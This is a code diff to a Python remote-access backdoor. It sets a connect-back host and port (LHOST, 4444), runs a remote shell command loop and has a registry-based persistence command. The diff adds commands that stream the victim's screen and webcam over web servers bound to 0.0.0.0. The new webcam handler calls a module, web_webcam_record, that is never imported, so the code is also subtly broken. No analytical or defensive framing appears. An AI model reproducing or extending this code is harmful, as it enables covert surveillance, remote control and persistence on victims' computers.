@@ -14,6 +14,7 @@ import termcolor
 import platform
 import getpass
 import web_server_backdoor
+import web_screen_record
 import cv2
 import mss
 import threading
@@ -21,13 +22,8 @@ import time
 import pyautogui
 
 
-resolution = pyautogui.size()
+LHOST = "127.0.0.1";PORT = 4444
 
-
-
-
-
-LHOST = "127.0.0.1";PORT = 4443
 
 def reliable_send(data):
     jsondata = json.dumps(data)
@@ -167,14 +163,12 @@ def shell():
             os.remove('recorded.wav')
         elif cmd[:13] == 'screen_record':
             if cmd[14:] == 'on':
-                web_server_backdoor.start_server()
+                web_screen_record.app(host="0.0.0.0")
             if cmd[14:] == 'off':
-                web_server_backdoor.shutdown()
-        # elif cmd == 'record_cam':
-        #     cam_record()
-        #     upload_file('cam_record.mp4')
-        #     reliable_send('[+] Done recording')
-        #     os.remove('cam-record.mp4')
+                web_screen_record.shutdown_server()
+        elif cmd[:6] == 'webcam':
+            if cmd[7:] == 'on':
+                web_webcam_record.app(host="0.0.0.0")
         elif cmd[:11] == 'persistence':
             reg_name, copy_name = cmd[12:].split(' ')
             persist(reg_name, copy_name)
